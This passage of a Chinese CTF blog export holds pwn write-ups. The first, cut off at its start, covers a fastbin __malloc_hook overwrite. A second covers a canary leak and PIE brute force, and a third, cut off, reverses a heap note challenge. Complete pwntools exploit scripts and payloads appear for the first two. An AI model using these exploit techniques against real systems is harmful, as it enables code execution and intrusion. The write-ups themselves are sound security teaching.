alt=""></li><li>有一个需要注意的问题，我们查出来的one_gadget并不是每个都能正常用，一般来说比如我们打__malloc_hook函数，后三个是可以用的，但是这道题只有最后一个可以打通。也就是说one_gadget的调用要看实际的栈情况（使用是有条件的，比如 *[rsp+0x70]==NULL*）。如果mallochook打不通，可以尝试打reallochook调整栈空间，然后再跳one_gadget,mallochook的调用指令是jmp,freehook调用的指令是call。详细看这里<a href="https://blog.csdn.net/Maxmalloc/article/details/102535427" target="_blank" rel="noopener">onegadget不起作用s</a><h2 id="0x02-整体思路"><a href="#0x02-整体思路" class="headerlink" title="0x02 整体思路"></a>0x02 整体思路</h2></li><li>首先我们通过vim 2，读入%p，cat 2来泄露libc的加载基址</li><li>然后我们再vim 2，vim 1申请两个chunk，再rm掉已备后续使用。此时的堆情况如下 <img src="https://s1.ax1x.com/2020/05/22/YLAlMF.png" alt="">，可以看到一共有三个chunk，然后被我们free了两个，他们在fastbin里（不同的fastbin因为他们大小不一样）由于free后没有置NULL，我们可以UAF。</li><li>继续vim2,此时内存中小chunk在上，大chunk在下，我们通过对小chunk进行堆溢出，改写大chunk的fd指针如下：<img src="https://s1.ax1x.com/2020/05/22/YLAlMF.png" alt=""> <img src="https://s1.ax1x.com/2020/05/22/YLARRf.png" alt="">,这里应该解释一下，我们是准备替换malloc_hook为one_gadget，此时应该fd应该改写为 <em>malloc_hook-0x13</em>,其实原因就是我们其实是把<strong>malloc_hook那个位置做成了一个fake_chunk，而fake_chunk必须要满足size的验证。可以看这篇文章。[堆漏洞挖掘:28—fastbin attack漏洞之</strong>malloc_hook攻击](<a href="https://blog.csdn.net/qq_41453285/article/details/99321101" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99321101</a>)</li><li>当做好伪chunk后直接vim 1此时因为上一个出fastbin的chunk的fd已经被我们做成了指向<strong>malloc_hook，此时vim 1的话，会直接指向</strong>malloc_hook然后执行被我们替换掉的one_gadget,攻击完成。关于<strong>malloc_hook请看这里[</strong>malloc_hook](<a href="https://eqqie.cn/index.php/laji_note/911/)，当我们换掉了__malloc_hook中原本为NULL的指针，此时会跳转到我们的地址执行，完成劫持。" target="_blank" rel="noopener">https://eqqie.cn/index.php/laji_note/911/)，当我们换掉了__malloc_hook中原本为NULL的指针，此时会跳转到我们的地址执行，完成劫持。</a></li></ul><p><em>其实<strong>malloc_hook相当于给malloc函数套了一层外壳，当这个函数指针的值不为NULL时，系统在调用malloc是就会触发这个hook，执行hook所指向的函数。合理构造该函数就可以达到自定义malloc的行为，捕获甚至控制返回值。于是我们想到通过之前的uaf和fastbin相关的知识，把堆块构造到该处便可以修改hook函数为自定义位置的函数，达到getshell的目的。类似的还有</strong>free_hook， __realloc_hook 等，原理大同小异</em></p><ul><li>下面上一张图大家更好理解一些<img src="https://s1.ax1x.com/2020/05/22/YLjBm6.png" alt=""></li></ul><h2 id="0x02攻击过程"><a href="#0x02攻击过程" class="headerlink" title="0x02攻击过程"></a>0x02攻击过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim 2 -&gt; %p -&gt; cat 2 -&gt; 拿到libc地址</span><br><span class="line">-&gt; vim 2 -&gt; vim 1 -&gt; rm 2 -&gt; rm 1 -&gt; vim 2 -&gt; 堆溢出修改vim 1的fd指针指向__malloc_hook</span><br><span class="line">-&gt; vim 1 -&gt; 此时fastbin中的vim 1被拿出来，fastbin指向我们修改后的fd的地址</span><br><span class="line">-&gt; vim 1 -&gt; 写入one_gadget地址，此时__malloc_hook的里地址被换掉了，当再次调用malloc时(也就是vim 1)，会跳转到one_gadget执行。</span><br></pre></td></tr></table></figure><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment"># attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># 0x7f00c113d963 - 0x7f00c0d79000</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">'vim 2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"%p"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"&gt; &gt; "</span>)</span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line">io.sendline(<span class="string">"cat 2"</span>)</span><br><span class="line"><span class="comment"># 第一次当vim 1为空时，利用vim 2 泄漏地址</span></span><br><span class="line">val=io.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">log.info(hex(int(val,<span class="number">16</span>)))</span><br><span class="line">now = hex(int(val,<span class="number">16</span>))</span><br><span class="line">libc.address = int(now,<span class="number">16</span>) -  <span class="number">0x3c4963</span></span><br><span class="line">log.info(hex(libc.address))</span><br><span class="line">log.info(<span class="string">"leak libc base done!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#====================================</span></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">'vim 2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"ppppp"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">'vim 1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">"aaaaa"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; &gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">'rm 2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">'rm 1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'vim 2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(hex(malloc_hook))</span><br><span class="line">log.info(<span class="string">"leak malloc hook done!\n"</span>)</span><br><span class="line">payload = flat(<span class="string">'p'</span>*<span class="number">0x30</span>,p64(<span class="number">0</span>),p64(<span class="number">0x71</span>),p64(malloc_hook<span class="number">-0x13</span>)) <span class="comment"># 从vim1向vim2溢出修改fd指针</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"vim 1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"a"</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">one_gadgets = libc.address + <span class="number">0xf1147</span></span><br><span class="line">log.info(hex(one_gadgets))</span><br><span class="line">log.info(<span class="string">"one gadgets done."</span>)</span><br><span class="line">payload = flat(<span class="string">'aaa'</span>,p64(one_gadgets))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"vim 1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">"vim 1"</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#vim2 -&gt; cat2 -&gt; vim2 -&gt; vim1 -&gt; rm1 -&gt; rm2 -&gt; vim2 -&gt; vim1 -&gt; vim1 -&gt; vim1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网鼎杯 &amp;&amp; fastbin &amp;&amp; UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>canary绕过与ROP.md</title>
    <link href="/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/"/>
    <url>/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-考查知识点"><a href="#0x01-考查知识点" class="headerlink" title="0x01 考查知识点"></a>0x01 考查知识点</h2><ul><li>Canary的泄露与绕过</li><li>开启PIE后地址的确定<h2 id="0x02-程序概览"><a href="#0x02-程序概览" class="headerlink" title="0x02 程序概览"></a>0x02 程序概览</h2></li><li>我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512字节，<strong>注意，这里很重要，第一次读取了255；第二次读取了512</strong>，然后又将栈上内容输出。<img src="https://s1.ax1x.com/2020/05/13/YUc7ut.png" alt=""></li></ul><ul><li>看一下程序的保护,保护全开。<img src="https://s1.ax1x.com/2020/05/13/YUglVK.png" alt="">)<img src="https://s1.ax1x.com/2020/05/13/YU2dSJ.png" alt=""></li><li>那这个程序其实利用点就很明显了，Got表不可写，地址随机化+Canary。。。万幸我们发现了程序中的<code>flag()</code>函数，这个函数可以直接pwn，所以目标就是ROP到<code>flag()</code>函数。<img src="https://s1.ax1x.com/2020/05/13/YUgY2d.png" alt=""></li></ul><h2 id="0x03-攻击思路"><a href="#0x03-攻击思路" class="headerlink" title="0x03 攻击思路"></a>0x03 攻击思路</h2><ul><li>首先，这是一个带Canary的程序，我们必须先拿到Canary，我们选择在第一个二write处泄漏Canary，此时的write输出时会将Canary的值带出来。</li><li>当我们拿到Canary以后，进入第二个read，<code>padding + p64(Canary) + &#39;a&#39;*8 + flag_address</code>这就是我们的payload，实际就是把Canary拼进我们的payload，<strong>将栈上原本是Canary的地方覆盖为Canary</strong>（可能这句话有些奇怪，但是意思应该很好理解，就是保持Canary不变，防止触发stack smashing），接下来填充8字节垃圾值，到达返回地址，我们将放回地址覆盖为<code>flag()</code>函数的地址就好。</li><li>在覆盖地址的时候，经过我的观察，我们的目标地址，与他原本的返回地址直接，<strong>只有最后两个字节不一样，所以由于PIE，我们只用爆破最后两个字节就可以了，其实只用爆破一个字节，pie最多影响到0x1000，这个爆破量很低</strong><img src="https://s1.ax1x.com/2020/05/13/YU2FsI.png" alt="">)经过观察，原本返回地址的后三位0x2ff,我们目标返回的<code>flag()</code>后三位：0x185,所以最后一个字节我们直接拿<code>\x85</code>覆盖掉，倒数第二个字节我们爆破。</li></ul><h2 id="0x04-攻击过程"><a href="#0x04-攻击过程" class="headerlink" title="0x04 攻击过程"></a>0x04 攻击过程</h2><ul><li>首先我们把Canary泄漏出来。首先我们构造254个’a’然后sendline,这个时候write会把Cananry带出来，当然，被带出来的不只有Canary，还有一些我们不需要的值。不过这里有一个坑，在我们第一次read的时候，我们最多只能read进来255个字节的内容，这实际上跟Canary是有一个距离的，所以导致我们在接收返回时要丢掉这些垃圾值才接收到Canary<img src="https://s1.ax1x.com/2020/05/13/YURMtO.png" alt="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="string">"""解释一下最后一行，由于我们接受了十个\x00。此时我们不仅接收到了8个垃圾\x00以及一个我们由于输入长度不够未填充到的\x00，还有一个Cananry的\x00也被我们接收过滤了，所以我们再接7个字节，这就是除了最低字节\x00以外的Canary的值，然后我们使用rjust给他填充到8字节，不足的\x00补全，此时就是完整的Cananry了"""</span></span><br></pre></td></tr></table></figure>  经过我们的调试我发现在把Canary泄露出来的同时，后面有18个字节的垃圾值也被泄漏出来的，所以我们再加一个<code>io.recv(18)</code>来过滤掉Canary后的18个字节垃圾值。以免影响后面的过程。</li><li>在我们拿到Canary后，就可以拼入第二个read的payload里了，此时使用第二个read做溢出来覆盖返回地址，<strong>因为第二个read读进来512个字节，完全能够满足溢出的长度，不像第一个read覆盖不到。</strong>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recv(<span class="number">18</span>)</span><br><span class="line">p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary拼进去，此时就不会由于Cnanary被破坏导致stack smashing，'p'*8是为了覆盖在Canary和ret之间的s</span></span><br><span class="line">io.send(p2)</span><br></pre></td></tr></table></figure>  <img src="https://s1.ax1x.com/2020/05/13/YURrcj.png" alt=""></li><li>接下来就是ret地址的问题了，因为我们只需要爆破一个字节（其实是半个字节），我们打一个while(1)循环直接爆就行，这块没什么技术含量。可以看到在p2中我们最后是这样写的<code>\x85 + \xf1</code>，这个85是确定的，而0xf1中f是被PIE随机化的，其实我们只需要爆这半个字节。</li></ul><h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding='utf-8'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line"><span class="comment">#io = process("./a.out")</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">""</span>)</span><br><span class="line">        payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">        io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">        log.info(hex(canary))</span><br><span class="line">        io.recv(<span class="number">18</span>)</span><br><span class="line">        p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary</span></span><br><span class="line">        io.send(p2)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"cat flag.txt"</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error ret"</span></span><br></pre></td></tr></table></figure><h2 id="0x06-相关知识补充"><a href="#0x06-相关知识补充" class="headerlink" title="0x06 相关知识补充"></a>0x06 相关知识补充</h2><p><a href="https://wiki.x10sec.org/pwn/mitigation/Canary/#1canary" target="_blank" rel="noopener">CTFWIKI_Canary</a></p><ul><li>不知道大家有没有发现一个问题，关于snprintf函数，为什么我们的write能泄露出Canary？？明明我们只读入了255个字节，snprintf也只是拷贝了256个字节。这牵扯到一个snprintf的问题。<img src="https://s1.ax1x.com/2020/05/13/YUW0Vx.png" alt=""></li><li>请看官方手册内容：</li></ul><p><em>The functions snprintf() and vsnprintf() do not  write  more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of  characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been  available.  Thus,  a  return value  of  size  or more means that the output was truncated.</em></p><ul><li>这段话信息量很大，总结一下就是<strong>如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10！</strong><img src="https://s1.ax1x.com/2020/05/13/YUfWpF.png" alt="">这个过程就很明显了，首先recvbuf放入%s然后和那一串“You say…..”一起放进&amp;s里，<strong>此时size=256，造成截断，返回值大于256！！更通俗来说，在此时snprintf的返回值是：“欲写入的size”，而不是“实际写入的size”</strong>，于是造成了v0 &gt; 256 ，最终让我们达到了泄露Canary的目的。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Canary &amp;&amp; PIE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从一道菜单题锻炼pwn中的堆技能</title>
    <link href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/"/>
    <url>/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-写在前面"><a href="#0x0-写在前面" class="headerlink" title="0x0 写在前面"></a>0x0 写在前面</h2><ul><li>如果你已经pwn中的堆有了一个基本的认识，但是你不知道如何将这些知识应用起来，以至于做题、看wp的无从下手，也看不懂别的师傅的题解，那么希望我这篇文章可以帮助到你。</li><li>如果你还没有对pwn中的堆有一个大概的认识，那么这篇文章可能看的有些早了，我向你推荐如下的资料，相信你能收获很多，到时候再尝试这道题应该比较合适。</li><li><a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">堆的基本结构,以及一些堆的攻击方式,来自CTF_wiki</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/heapoverflow_basic/" target="_blank" rel="noopener">堆溢出,来自CTF_wiki</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/unlink/" target="_blank" rel="noopener">Unlink攻击,来自CTF_wiki</a></li><li><a href="https://www.bilibili.com/video/BV1h7411r7K5" target="_blank" rel="noopener">b站一个师傅的linux-pwn中的堆攻击教程,感谢Dsyzy师傅</a></li></ul><h2 id="0x01-题目概览"><a href="#0x01-题目概览" class="headerlink" title="0x01 题目概览"></a>0x01 题目概览</h2><ul><li>可以看到，是一个典型的菜单题<img src="https://s1.ax1x.com/2020/05/09/YQtRrF.png" alt=""><br>然后我们尝试调试一下他,发现他删掉了符号<img src="https://s1.ax1x.com/2020/05/09/YQNFsS.png" alt=""> 然后我们拉近ida看一下，把一些关键函数的符号恢复（右键rename）一下,这是我们的主函数<img src="https://s1.ax1x.com/2020/05/09/YQNKzV.png" alt=""></li><li>我们先进<code>Init()</code>看一下,他这里初始化了一下缓冲区<img src="https://s1.ax1x.com/2020/05/09/YQNNJ1.png" alt=""></li><li>然后是<code>create_table()</code>函数,我箭头所指的地方，他首先开了一个1810的堆，这个堆是一个索引表，用来保存笔记的（也就是我们的note）然后我们将<code>qword_6020A8</code>重命名为<code>list_0</code>，这个list_0是一个结构体指针/结构体，for循环那个位置实际上在对结构体中的成员做初始化<br><img src="https://s1.ax1x.com/2020/05/09/YQUm0e.png" alt=""> 恢复(rename)后<br><img src="https://s1.ax1x.com/2020/05/09/YQUCk9.png" alt="">来看看这结构体 <img src="https://s1.ax1x.com/2020/05/09/YQUIc6.png" alt=""><br>然后整体总结一下这个地方：<strong>由 v0 = 256 ，(list + 8) = 0，看出 list 结构体存在两个普通8字节变量; 由 (list_0 + 24LL * i + 16) 可以看出，list 结构体中存在一个结构体数组变量，将其命名为 struct_array; 由 list_0 + 24LL * i + 16/24/32 可以看出，struct_array 结构体含有三个8字节变量。</strong>接下来为了辅助分析，自定义结构体，以使代码更简明</li></ul><ul><li>接下来我们恢复结构体(这个我研究了好久)<br>首先我们调出这个界面<img src="https://s1.ax1x.com/2020/05/09/YQBgYQ.png" alt=""> 然后以这个语法创建新的结构体<img src="https://s1.ax1x.com/2020/05/09/YQDm0f.png" alt=""> 这个时候返回structures，发现已经创建好了<img src="https://s1.ax1x.com/2020/05/09/YQD1pj.png" alt=""> 当然此时我们的结构体是空的，我们按照以下操作(这里稍微有点问题，应该是将鼠标放到ends那个地方按d就可以了)创建结构体成员<img src="https://s1.ax1x.com/2020/05/09/YQDvCQ.png" alt=""> 接下来我们修改成员为宽字节dq，鼠标放上去直接连按着d直到他变为dq<img src="https://s1.ax1x.com/2020/05/09/YQrJ8H.png" alt="">  好的我们接着把strcu_array创建完<img src="https://s1.ax1x.com/2020/05/09/YQyEc9.png" alt=""> 接下来是索引表中的表项struct_list结构体<img src="https://s1.ax1x.com/2020/05/09/YQ2FV1.png" alt=""> ok,看一下完整的恢复完的结构体们<img src="https://s1.ax1x.com/2020/05/09/YQ2e2D.png" alt=""> 然后我们将结构体同步到反汇编的代码中，找到我们的list_0，将类型改为struct_list <em><img src="https://s1.ax1x.com/2020/05/09/YQRBOH.png" alt=""> 然后回到Init函数，f5刷新，这个时候就非常非常清晰了！注意，此时的list_0不同于我们一开始重命名的list_0，此时的list_0已经变成了一个真正的struct_list <em>类型,也就是我们指向索引表的指针。然后此时很容易看出来<code>result-&gt;list_0</code>中的list_0就是count，从 New 函数中的 if ( list-&gt;field 8 &lt; list-&gt;count) 可以看出，list_8 为 current_count，我们再进行简化。<img src="https://s1.ax1x.com/2020/05/09/YQWp7R.png" alt="">)<img src="https://s1.ax1x.com/2020/05/09/YQf9Kg.png" alt=""> field_0, field_8, field_10暂时看不出什么作用，再去New、edit函数看一看然后发现，在new中有这样一行<code>list_0-&gt;struct_array[i].field_8 = length</code>,在edit中有这样一行<code>if ( v3 &lt; 0 || v3 &gt;= list_0-&gt;count || list_0-&gt;struct_array[v3].field_0 != 1 )</code></em></em>所以field_8应该是当前笔记的长度，命名为len；field_0应该是一个标志位，0标记是否使用，为 0 时才创建堆块，将其命名为 flag，然后再看这两行可知，field_10就是输入的字符串的地址，我们命名为buf**</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">malloc</span>((<span class="number">0x80</span> - length % <span class="number">0x80</span>) % <span class="number">0x80</span> + length);<span class="comment">// 大小为0x80的倍数</span></span><br><span class="line">list_0-&gt;struct_array[i].field_10 = (__int64)v1;<span class="comment">// 这一笔记对应堆的地址</span></span><br></pre></td></tr></table></figure><ul><li>最后来看一下恢复完毕的效果<br><img src="https://s1.ax1x.com/2020/05/09/YQhiQO.png" alt=""><br><img src="https://s1.ax1x.com/2020/05/09/YQhnYt.png" alt=""></li></ul><p><strong>舒服！太舒服了，简直就是看源码。我们再回忆一下这个结构体的结构：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(8))) <span class="title">struct_list</span>      //这是索引表结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">__int64 count;                                    <span class="comment">//这是索引表中能存放的最多笔记note（堆）数量</span></span><br><span class="line">__int64 current_count;                            <span class="comment">//这是当前已经存放的数量</span></span><br><span class="line">struct_array struct_array[<span class="number">256</span>];                   <span class="comment">//这是每个存放的笔记的一些信息</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct_array</span>                                 //这里实际上就是索引表中的一个<span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">__int64 flag;                                     <span class="comment">//标志位，代表是否被使用</span></span><br><span class="line">__int64 len;                                      <span class="comment">//存放在此结构体中笔记的长度</span></span><br><span class="line">__int64 buf;                                      <span class="comment">//存放在此结构体中的note的内容，buf实际是个指针，指向存放此note的堆的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>好了，题目基本上恢复完了，其实漏洞还是比较明显的。首先我们看edit中的Input函数，发现在读取内容的时候，少了\x00结束符，那么这里可以造成一个堆溢出。<img src="https://s1.ax1x.com/2020/05/09/YQTheU.png" 